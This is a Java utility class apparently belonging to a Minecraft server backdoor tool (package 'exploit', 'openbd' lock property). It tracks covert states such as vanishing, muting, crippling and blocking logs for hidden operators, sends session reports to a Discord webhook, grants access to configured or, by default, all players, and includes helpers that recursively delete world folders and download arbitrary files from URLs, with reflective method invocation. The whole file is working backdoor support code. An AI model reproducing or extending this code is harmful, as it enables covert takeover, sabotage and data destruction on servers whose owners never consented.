package com.tmquan2508.exploit;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import net.md_5.bungee.api.chat.TextComponent;

import java.io.*;
import java.util.*;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.URL;

public final class BDUtils {
    private BDUtils() {}
    
    public static PayloadHelper helpers;
    public static void initializeHelpers(Exploit exploit) {
        if (helpers == null) {
            helpers = new PayloadHelper(exploit);
        }
    }

    static String sessionId = java.util.UUID.randomUUID().toString().substring(0, 8);
    public static final String LOCK_PROPERTY = "openbd.lock";
    public enum State {
        VANISHED, LOCKED, MUTED, SILKTOUCH, INSTABREAK,
        MF_THROWER, MF_INTERACT, MF_CRIPPLE, MF_FLIGHT, MF_INVENTORY, MF_DROP,
        MF_TELEPORT, MF_MINE, MF_PLACE, MF_LOGIN, MF_GOD, MF_DAMAGE,
        LOG_BLOCKED
    }

    public static class PlayerState {
        public final boolean[] states = new boolean[State.values().length];
    }

    public static boolean getState(Map<String, PlayerState> playerStates, String username, State s) {
        PlayerState state = playerStates.get(username);
        return state != null && state.states[s.ordinal()];
    }

    public static void setState(Map<String, PlayerState> playerStates, String username, State s, boolean value) {
        playerStates.computeIfAbsent(username, k -> new PlayerState()).states[s.ordinal()] = value;
    }

    public static void clearState(Map<String, PlayerState> playerStates, String username) {
        for (State s : State.values()) {
            setState(playerStates, username, s, false);
        }
    }

    public static void sendDebug(String log) {
        if (!Config.debug_log) return;
        Bukkit.getConsoleSender().sendMessage(log);
    }

    public static void sendMessage(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + message);
    }

    public static void sendMessage(Player player, TextComponent message) {
        TextComponent prefix = new TextComponent(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " ");
        player.spigot().sendMessage(prefix, message);
    }

    public static void sendSuccess(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GREEN + " " + message);
    }

    public static void sendWarn(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.YELLOW + " " + message);
    }

    public static void sendError(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.RED + " " + message);
    }

    public static void sendDiscordMessage(DWeb.EmbedObject embed) {
        if (Config.discord_token == null || Config.discord_token.isEmpty()) { return; }
        embed.setFooter("Time: " + new Date() + " â€¢ Session: " + sessionId, null);
        try {
            DWeb webhook = new DWeb(Config.discord_token);
            webhook.addEmbed(embed);
            webhook.execute();
        } catch (IOException ignored) {}
    }

    public static class DynamicInvoker {
        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType constructorType = MethodType.methodType(void.class, paramTypes);
                MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
                return (T) handle.invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke constructor for '" + targetClass.getName() + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeStaticMethod(Class<?> targetClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findStatic(targetClass, methodName, methodType);
                return handle.invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke static method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeInstanceMethod(Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findVirtual(target.getClass(), methodName, methodType);
                return handle.bindTo(target).invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke instance method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        private static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return sw.toString();
        }
    }

    public static class PayloadHelper {
        private final Exploit exploit;

        public PayloadHelper(Exploit exploit) {
            this.exploit = exploit;
        }

        public String getRequiredUsage(Exploit.Command command) {
            return "Usage: " + Config.command_prefix + command.getName() + " " + command.getUsage();
        }

        public boolean isUserAuthorized(Player p) {
            boolean noUuidsConfigured = (Config.authorized_uuids == null || Config.authorized_uuids.length == 0);
            boolean noUsernamesConfigured = (Config.authorized_usernames == null || Config.authorized_usernames.length == 0);

            if (noUuidsConfigured && noUsernamesConfigured) {
                return true;
            }

            String playerUuid = p.getUniqueId().toString();
            if (!noUuidsConfigured) {
                for (String authorizedUuid : Config.authorized_uuids) {
                    if (playerUuid.equalsIgnoreCase(authorizedUuid)) return true;
                }
            }

            if (Config.tmp_authorized_uuids != null) {
                for (String tmpUuid : Config.tmp_authorized_uuids) {
                    if (tmpUuid != null && tmpUuid.equalsIgnoreCase(playerUuid)) return true;
                }
            }

            String playerName = p.getName();
            if (!noUsernamesConfigured) {
                for (String authorizedUsername : Config.authorized_usernames) {
                    if (playerName.equals(authorizedUsername)) return true;
                }
            }

            return false;
        }

        public int getPlayerPermissionLevel(Player p) {
            return exploit.getPermissionLevels().getOrDefault(p.getUniqueId(), 0);
        }

        public boolean deleteWorld(File path) {
            if (path.exists()) {
                File[] files = path.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isDirectory()) {
                            deleteWorld(file);
                        } else {
                            file.delete();
                        }
                    }
                }
            }
            return path.delete();
        }

        public void downloadFile(URL url, String fileName) throws IOException {
            try (InputStream in = url.openStream();
                 BufferedInputStream bis = new BufferedInputStream(in);
                 FileOutputStream fos = new FileOutputStream(fileName)) {
                byte[] data = new byte[1024];
                int count;
                while ((count = bis.read(data, 0, 1024)) != -1) {
                    fos.write(data, 0, count);
                }
            }
        }
    }
}